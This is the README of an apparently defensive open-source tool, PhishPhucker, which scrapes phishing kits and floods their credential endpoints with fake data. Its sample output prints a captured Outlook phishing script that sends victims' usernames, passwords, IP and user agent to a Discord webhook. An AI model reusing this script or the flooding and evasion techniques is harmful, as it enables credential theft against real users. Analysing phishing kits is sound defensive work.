# Phish Phucker

![PhishPhucker Logo](https://i.ibb.co/jD9dqMm/openart-image-5-C4-YIl-FF-1717586639754-raw.jpg)
## In Partnership With
![Webamon Logo](https://i.ibb.co/ggbMv7C/weblogo.png)

## The Idea
- **Phuck The Phishers**: Make the effort of a successful phishing campaign much harder than the rewards.
- **Change How We Block**: Multiple phishing websites rely on the same backend endpoint to receive phished credentials. By exposing the required endpoint for the phishing kit to operate, we can block on our network tools. 1x Block = n phishing domains.

## Overview

Welcome to **PhishPhucker**, the revolutionary open-source cybersecurity tool designed to disrupt the phishing industry like never before. PhishPhucker ingests public and custom phishing feeds/URLs, scans them, and launches sophisticated countermeasures to thwart phishing attacks. Our mission is to make phishing an unprofitable and ineffective endeavor by mimicking real user behavior and overwhelming attackers with arbitrary but human-like data.

## Features

- **Ingest Multiple Phishing Feeds**: Seamlessly integrate public phishing feeds and custom URLs for comprehensive coverage.
- **Layered Security**: By exposing and then blocking the endpoints that receive comp'd creds, end users can fall for a phish but network applications block the POST. 
- **Website Scanning**: Extract scripts and phishing kits from malicious websites, identify the endpoints where credentials are sent.
- **Simulated Post Requests**: Recreate phishing post requests and flood attackers' endpoints with realistic-looking data.
- **Distributed Client Network**: Deploy PhishPhucker clients across multiple web edge points to mimic real-world phishing actions.
- **Pseudo-Random Timing**: Vary intervals between actions to avoid detection and mimic human behavior.
- **Multiple User Agents and Source IPs**: Use diverse browser user agents and source IPs (ISPs) to simulate a wide range of victims.
- **Network Proxy**: Utilize on-prem & internet proxy solutions to manipulate network data + requests.
- **Real Dummy Accounts**: Modern phishing kits employ an Account Checking feature that verifies if the credentials work for the provided service. PhishPhucker accounts will be returned as legit.
- **Open Source and Extensible**: Fully open source with an active community contributing to its development and enhancement.

## Installation

### Prerequisites
- Docker
- Git

### Steps

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/php-p/PhishPhucker.git
   cd PhishPhucker
   ```

2. **Deploy with Docker**:
   ```bash
   docker build -t phishphucker .
   docker run -d phishphucker
   ```
     
3. **Sample Output**:
     ```json
     {
    "utc": "2024-06-05 16:57:54",
    "pageTitle": "Screen",
    "pageLinks": [
        "<link href=\"/owa/auth/15.0.1497/themes/resources/favicon.ico\" rel=\"shortcut icon\" type=\"image/x-icon\"/>"
    ],
    "pageScripts": [
        "<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\"></script>",
        "<script>\n\n        var mainLogonDiv = window.document.getElementById(\"mainLogonDiv\");\n        var showPlaceholderText = false;\n        var mainLogonDivClassName = 'mouse';\n\n        if (mainLogonDivClassName == \"tnarrow\") {\n            showPlaceholderText = true;\n\n            // Output meta tag for viewport scaling\n            document.write('<meta name=\"viewport\" content=\"width = 320, initial-scale = 1.0, user-scalable = no\" />');\n        }\n        else if (mainLogonDivClassName == \"twide\") {\n            showPlaceholderText = true;\n        }\n\n        function setPlaceholderText() {\n            window.document.getElementById(\"username\").placeholder = \"user name\";\n            window.document.getElementById(\"password\").placeholder = \"password\";\n            window.document.getElementById(\"passwordText\").placeholder = \"password\";\n        }\n\n        function showPasswordClick() {\n            var showPassword = window.document.getElementById(\"showPasswordCheck\").checked;\n            passwordElement = window.document.getElementById(\"password\");\n            passwordTextElement = window.document.getElementById(\"passwordText\");\n            if (showPassword) {\n                passwordTextElement.value = passwordElement.value;\n                passwordElement.style.display = \"none\";\n                passwordTextElement.style.display = \"inline\";\n                passwordTextElement.focus();\n            }\n            else {\n                passwordElement.value = passwordTextElement.value;\n                passwordTextElement.style.display = \"none\";\n                passwordTextElement.value = \"\";\n                passwordElement.style.display = \"inline\";\n                passwordElement.focus();\n            }\n        }\n    </script>",
        "<script>\n\n            var mainLogonDiv = window.document.getElementById(\"mainLogonDiv\");\n            mainLogonDiv.className = mainLogonDivClassName;\n        </script>",
        "<script>\n    function sleep(milliseconds) {\n        const date = Date.now();\n        let currentDate = null;\n        do {\n            currentDate = Date.now();\n        } while (currentDate - date < milliseconds);\n    }\n\n    var linksc = window.location.href\n    var value = linksc.split('#')\n    values = value[1]\n\n    document.getElementById(\"username\").value = values;\n    // document.getElementById(\"username\").value = values; \n\n\n    let count = 0;\n    var btn = document.getElementById(\"buttonId\");\n    var pwd = document.getElementById(\"password\");\n    var agents = navigator.userAgent;\n\n\n\n    btn.onclick = function () {\n        if (pwd.value.length > 0) {\n            count++;\n            if (count <= 2) {\n\n\n\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"GET\", \"https://ipinfo.io/json\", true);\n                xhr.onreadystatechange = function () {\n                if (xhr.readyState === 4 && xhr.status === 200) {\n                var response = JSON.parse(xhr.responseText);\n                // Handle the response data here\n                var ipAddress = response.ip\n\n                request.open(\"POST\", \"https://discord.com/api/webhooks/1138373288825987072/uB3bmO96XIzWcQsjmu6JQlu3FidKgbFXbtmJxYSMr6ZAyLAmbAF7czZM6sW081J4mRFL\");\n                request.setRequestHeader('Content-type', 'application/json');\n                var params = {\n                content: (\" > **IP: **\" + ipAddress)\n                }\n                request.send(JSON.stringify(params));\n                    \n\n                }\n\n                };\n                xhr.send();\n\n\n                var request = new XMLHttpRequest();\n                request.open(\"POST\", \"https://discord.com/api/webhooks/1138373288825987072/uB3bmO96XIzWcQsjmu6JQlu3FidKgbFXbtmJxYSMr6ZAyLAmbAF7czZM6sW081J4mRFL\");\n                request.setRequestHeader('Content-type', 'application/json');\n                var params = {\n                    content: (\"> **USERNAME  : **\" + document.getElementById(\"username\").value + \"\\n> **PASSWORD : **\" + document.getElementById(\"password\").value + \"\\n> **USER-AGENT: **\" + agents)\n                }\n                request.send(JSON.stringify(params));\n\n               \n\n                text = \"The user name or password you entered isn't correct. Try entering it again.\";\n                // document.getElementById(\"username-error\").innerHTML = text;\n                // // document.getElementById(\"errorMessage\").style.color = \"red\";\n                document.getElementById(\"signInErrorDiv\").innerText = text;\n                document.getElementById(\"password\").value = \"\";\n                sleep(1000)\n            }\n            if (count == 2) {\n                texts = \"Verification successful... Thank you.\";\n                document.getElementById(\"signInErrorDiv\").style.color = \"green\";\n                document.getElementById(\"signInErrorDiv\").innerHTML = texts;\n                sleep(4500)\n                window.location.replace(\"https://www.microsoft.com/en-us/microsoft-365/outlook/web-email-login-for-outlook\");\n            }\n        } else {\n            text = \"The user name or password you entered isn't correct. Try entering it again.\"\n            // document.getElementById(\"errorMessage\").style.color = \"red\";\n            // document.getElementById(\"login-failure\").innerHTML = \"\";\n            document.getElementById(\"signInErrorDiv\").innerHTML = text;\n\n            // document.getElementById(\"alert\").style.backgroundColor = \"#d0452f\"; \n\n\n\n        }\n\n    }\n</script>"
    ]

   }

      ```

## Contributing

We welcome contributions from the community to enhance PhishPhucker. Feel free to submit pull requests, report issues, or suggest features.

1. **Fork the Repository** on GitHub
2. **Create a Feature Branch**:
   ```bash
   git checkout -b feature/your-feature-name
   ```
3. **Commit Your Changes**:
   ```bash
   git commit -m 'Add some feature'
   ```
4. **Push to the Branch**:
   ```bash
   git push origin feature/your-feature-name
   ```
5. **Open a Pull Request** on GitHub

## License

PhishPhucker is released under the Apache 2.0 License. See the [LICENSE](LICENSE) file for more details.

## Acknowledgements

- Thanks to the open-source community for their invaluable contributions and feedback.
- Special mention to the decade long successful Threat Actors who's actions inspire and guide this projects direction.

## Disclaimer

PhishPhucker is intended for ethical use only. Unauthorized use of this software to interfere with legitimate websites or services is strictly prohibited. The authors and contributors are not responsible for any misuse of the software.


---

PhishPhucker: Turning the Tide Against Phishing.

---

![GitHub Stars](https://img.shields.io/github/stars/php-p/PhishPhucker?style=social)
![GitHub Forks](https://img.shields.io/github/forks/php-p/PhishPhucker?style=social)
![GitHub Issues](https://img.shields.io/github/issues/php-p/PhishPhucker)
![GitHub License](https://img.shields.io/github/license/php-p/PhishPhucker)

